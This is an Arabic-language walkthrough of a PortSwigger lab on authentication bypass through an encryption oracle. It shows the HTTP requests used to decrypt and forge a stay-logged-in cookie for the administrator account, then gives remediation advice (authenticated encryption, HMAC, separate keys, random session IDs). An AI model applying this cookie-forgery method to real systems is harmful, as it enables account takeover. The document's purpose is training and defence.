# [Authentication bypass via encryption oracle](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle)

## **`الهدف`**
الدخول إلى لوحة تحكم الإدارة وحذف المُستخدم `carlos.`
## **`خطوات الحل`**
نقوم بتسجيل الدخول إلى حساب `wiener:peter`، مع تفعيل خاصية `Stay logged in` لنلاحظ أن الـ `response` القادم من السيرفر به جزئية تُسمى `stay-logged-in` والتي تبدو مُشفرة.
```http
HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: stay-logged-in=NQTSEYFXoW57GrhNqfs5yDqm3l39KJ%2bb9ws9MBShw30%3d; Expires=Wed, 01 Jan 3000 01:00:00 UTC
Set-Cookie: session=8krOVK2LQ2Z0uSAJenDzJEoESEi4nW2X; Secure; HttpOnly; SameSite=None
```

وبعد ذلك نتوجه إلى خانة التعليقات في أى موضوع منشور في اللاب، ونقوم بكتابة الـ`email` بشكل خاطئ.
```http
POST /post/comment HTTP/2
Host: 0a5d007903c583ec818af78900fc00d4.web-security-academy.net
Cookie: stay-logged-in=NQTSEYFXoW57GrhNqfs5yDqm3l39KJ%2bb9ws9MBShw30%3d; session=8krOVK2LQ2Z0uSAJenDzJEoESEi4nW2X

csrf=1KtT3bFnWobeWct4MuIWdywl2pa88IiX&postId=9&comment=Wrong+Comment&name=Wrong+Name&email=test.com&website=
```

لنلاحظ في الـ `response` أن هناك جزء من الـ `cookie` يُسمى `notification` والذي يعرض نصًا مُشفرًأ.
```http
HTTP/2 302 Found
Location: /post?postId=9
Set-Cookie: notification=VLGO5tPDlmzlSbsoVcACKkzdkORKB81R8FS2OLzwBWQ%3d;
```

وفي الـ `request` الذي يحدث تلقائيًا من المتصفح ليطلب من السيرفر إعادة توجيه `redirect` نجد ان المتصفح قد يُرسل إلى السيرفر نفس النص المُشفر.
```http
GET /post?postId=4 HTTP/2
Host: 0a6200ac033ca1e581792f98008d005c.web-security-academy.net
Cookie: notification=VLGO5tPDlmzlSbsoVcACKkzdkORKB81R8FS2OLzwBWQ%3d; 
```

وعندما يأتي الـ `response` من الموقع، نلاحظ وجود إشعار أو ما يشبه رسالة تظهر في  أعلى صفحة الموقع `Invalid email address: test.com` وهذا يعنى أن الكلمة المُشفرة في الـ `notification` هي نفسها هذا النص بعد فك تشفيره.

وهذا يعنى أن الـ `request` الخاص بإرسال الـ `email` الخاطئ يقوم السيرفر بالرد عليه بنص مُشفر، وبعد ذلك يقوم المتصفح بإرسال طلب الـ `redirect` بنفس النص المُشفر لكي يقوم الموقع بإعادة فك تشفيره وعرضه كنص، وهذه هي الثغرة فقد اكتشفنا طريقة لجعل السيرفر يقوم بتفشير أى نص نريد، بالإضافة إلى جعل السيرفر يقوم بفك تشفير أى نص نريد.

سنقوم بتجربة الموضوع مع النص المُشفر لخاصية `Stay logged in`  من `request` تسجيل الدخول ونضعه بجانب `notification` في `request` فك التشفير.
```http
GET /post?postId=4 HTTP/2
Host: 0a6200ac033ca1e581792f98008d005c.web-security-academy.net
Cookie: notification=NQTSEYFXoW57GrhNqfs5yDqm3l39KJ%2bb9ws9MBShw30%3d; 
```

وعندما يأتي الـ `response` من الموقع، لنلاحظ وجود إشعار أو ما يشبه رسالة تظهر في  أعلى صفحة الموقع `wiener:1782307525059` هذا يعنى أنه يتكون من `account name:timestamp` إذا نستطيع التلاعب به للدخول إلى حساب `administrator`.

فنقوم بالذهاب إلى `request` التشفير أولًا ونضع `administrator:1782307525059` في خانة الـ `email.`
```http
POST /post/comment HTTP/2
Host: 0a6200ac033ca1e581792f98008d005c.web-security-academy.net
Cookie: stay-logged-in=NQTSEYFXoW57GrhNqfs5yDqm3l39KJ%2bb9ws9MBShw30%3d; session=rNxHReVlToFVvuSq4JCxjUE4w6QPGHzV

csrf=AG3HzAFRaswwIw5aSf9FnBFXFkd7EICn&postId=4&comment=wrong+comment&name=wrong&email=administrator:1782307525059&website=

```

فنحصل على الـ `response` وبه النص مُشفر.
```http
HTTP/2 302 Found
Location: /post?postId=4
Set-Cookie: notification=VLGO5tPDlmzlSbsoVcACKkwpq6ntcNpor9J9AgMnp9sw6Q5hQq7tuNSHF4SL31BIgbbAM%2f07hDUwtEDvBJrq0g%3d%3d;

```

لنقوم بنسخ الكود المُشفر فنضعه في `resquest` فك التشفير.
```http
GET /post?postId=4 HTTP/2
Host: 0a6200ac033ca1e581792f98008d005c.web-security-academy.net
Cookie: notification=VLGO5tPDlmzlSbsoVcACKkwpq6ntcNpor9J9AgMnp9sw6Q5hQq7tuNSHF4SL31BIgbbAM%2f07hDUwtEDvBJrq0g%3d%3d; stay-logged-in=NQTSEYFXoW57GrhNqfs5yDqm3l39KJ%2bb9ws9MBShw30%3d; session=rNxHReVlToFVvuSq4JCxjUE4w6QPGHzV
```

وعندما يأتي الـ `response` من الموقع، لنلاحظ وجود إشعار أو ما يشبه رسالة تظهر في  أعلى صفحة الموقع `Invalid email address: administrator:1782307525059`، وبالتالي لا يُمكننا استعمالها هكذا لذلك نحتاج لحذف الجزء الأول `Invalid email address: ` والذي يتكون من `19` حرف و `علامة خاصة واحدة` و `3` مسافات وهذا يعني مجموع كلي يساوي `23` وهنا لا نستطيع حذف الـ `23 Bytes` لأن الموقع لا يمسح بإزالة أجزاء من الـ `Bytes` الخاصة بالتشفير إلا إن كانت من مضاعفات الـ `16-32-48-64` وإلا سيحدث تلف في النص، لذلك سنقوم بإضافة `9` أحرف 
لتصبح العبارة هي `xxxxxxxxxInvalid email address: administrator:1782307525059` 
بحيث يكون الجزء الأول الذي سنقوم بإزالته هو `xxxxxxxxxInvalid email address: ` 
مُكون من `28` حرف و `علامة خاصة واحدة` و `3` مسافات وهذا يعنى مجموع كلي يساوي `32`

ثم نقوم بعمل تشفير للعبارة بنفس `request` التشفير وبعد ذلك نقوم بتحويل الناتج المُشفر إلى أداة `Decoder` بداخل `Burp Suite` لنقوم أولًا بعمل `Decode` لـ`URL` ثم `Decode` لـ`Base64` لتظهر لنا على هيئة `Bytes` فنقوم بحذف `32 Bytes` منها أو ما يوازى أول صفين وبعدها نقوم بعمل `Encode` لـ`Base64` ثم `Encode` لـ`URL` والأن أصبح لدينا `administrator:1782307525059` مُشفرة وجاهزة.

فنقوم بالضغط على `My account` ونعترض الـ `request`.
```http
GET /my-account?id=wiener HTTP/2
Host: 0a6200ac033ca1e581792f98008d005c.web-security-academy.net
Cookie: stay-logged-in=NQTSEYFXoW57GrhNqfs5yDqm3l39KJ%2bb9ws9MBShw30%3d; session=rNxHReVlToFVvuSq4JCxjUE4w6QPGHzV
```

ونقوم بحذف الـ `session` ونضع النص المُشفر الذي لدينا بجانب الـ `stay-logged-in=` ونقوم بتمريره. 
```http
GET /my-account?id=wiener HTTP/2
Host: 0a6200ac033ca1e581792f98008d005c.web-security-academy.net
Cookie: stay-logged-in=%6f%7a%43%6d%71%36%49%35%49%69%42%58%54%64%4a%6d%75%36%31%43%34%72%4c%4f%66%44%4f%58%4f%46%6a%70%62%44%4b%38%4d%5a%62%56%4f%77%55%3d
```

لنجد أن زر `Admin panel` قد ظهر لدينا في الحساب، فنقوم بالضغط عليه وندخل إلى لوحة التحكم ونحذف حساب `carlos` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب استخدام خوارزميات تشفير تضمن السرية والسلامة معًا، مثل `AES-GCM` أو `ChaCha20-Poly1305` بحيث إذا حاول المُهاجم حذف أي `Byte` أو تعديله، سيفشل فك التشفير تماماً ويرفض الموقع الـ `cookie.`

ويحب تخصيص مفتاح تشفير فريد لكل وظيفة، أو استخدام الـ `Key Derivation Function - KDF` لتوليد مفاتيح منفصلة. بحيث لو استطاع المُهاجم تشفير نص في خانة الإيميل، فلن يتمكن من استخدامه كـ `cookie` لتسجيل الدخول لأن المفاتيح مختلفة.

يجب تبسيط رسائل الخطأ لتكون عامة جداً `(Generic Error)` مثل `An error occurred` دون إعطاء أي تفاصيل برمجية أو رياضية عن التشفير.`

يجب عدم تخزين بيانات حساسة مثل `username:timestamp` داخل الـ `cookie` على جهاز المُستخدم حتى لو كانت مشفرة، ويكون الـ `Cookie` المُرسل للمُستخدم مجرد `Session ID` عشوائي `Cryptographically Secure Session ID`،  يتم توليده باستخدام دالة عشوائية آمنة تشفيرياً لمنع أى عمليات توقع أو تخمين من المُهاجم ويتم ربط المُستخدم به بشكل صارم في الواجهة الخلفية `back-end.`

وإذا كان من الضروري استخدام خوارزمية تشفير عادية مثل `AES-CBC`، يجب إضافة طبقة تحقق من الهوية والتكامل باستخدام `HMAC`، فبعد تشفير البيانات، يتم حساب الـ `HMAC = Hash-based Message Authentication Code` 
(يُشبه ختم شمع رقمي ليثبت سلامة البيانات وهوية المُرسل) للـ `Ciphertext` باستخدام مفتاح سري ويتم إرسال كلاهما داخل الـ `cookie.`

الـ `HMAC` هو `Hash(Secret Key + Ciphertext)` ودالة الـ `Hash` هي التي تأخذ
الـ `(Secret Key + Ciphertext)` وتضغطه باستخدام مفتاح سري وتكون النتيجة هي `HMAC` وهي سلسلة نصية ثابتة الطول وصغيرة (كمثال `64` حرف في `SHA-256` والتي لا يُنصح بإستعمالها في أشياء مثل كلمة المرور). وهذه السلسة تُعتبر بصمة إصبع فريدة لهذه للبيانات.

وعندما يستقبل السيرفر الـ `cookie`، يتأكد أولاً من صحة الـ `HMAC`؛ وإذا تم التلاعب بالبلوكات (كما حدث في اللاب بحذف الـ `32 bytes`)، سيتغير الـ `HMAC` ويرفض السيرفر الطلب فوراً قبل فك التشفير.

**`شرح الـ HMAC بطريقة مُبسطة:`** هناك بيانات نصية نقوم بتشفيرها بمفتاح والناتج الذي خرج يُسمى `Ciphertext` فنقوم بعمل بصمة / ختم شمع رقمي له بمفتاح سري (مختلف عن المفتاح السابق) لدالة الـ `Hash` والناتج يُسمى `HMAC` ويتم إرساله مع ناتج التشفير الأول `Ciphertext` داخل الـ `cookie` إلى المتصفح، ويتميز الـ `HMAC` بأنه لا يُمكن فكه عكسيًا حتى من السيرفر، لذلك عندما يتم إرسال الـ `Cookie` إلى السيرفر فإنه يقوم بإعادة حساب الـ `HMAC` مرة أخرى للمقارنة، وبمُجرد أن يتأكد من أنه لم يتم التلاعب به، يقوم بتمرير الـ `Ciphertext` على دالة (تشفير عكسية / فك التشفير) ويستخدم مفتاح التشفير الأول، وهذه العملية قابلة لفك التشفير لذلك تتحول الطلاسم إلى البيانات الأصلية مثل `(user_id=5 أو role=admin)`، وهكذا يستطيع السيرفر قراءة البيانات وتنفيذ المطلوب مثل فتح الحساب، ويجب ملاحظة أن المفتاح السري لدالة الـ `Hash` البيانات يختلف عن الدالة نفسها، فقد يعلم المُهاجم دالة الـ `Hash` التي يستعملها السيرفر ولكنه لا يملك مفتاحها السري.

**`ملاحظة:`** الـ `HMAC` هو احدى الاليات التى يستعملها الـ `JWT` في التوقيع السري في الجزء الثالث منه.`
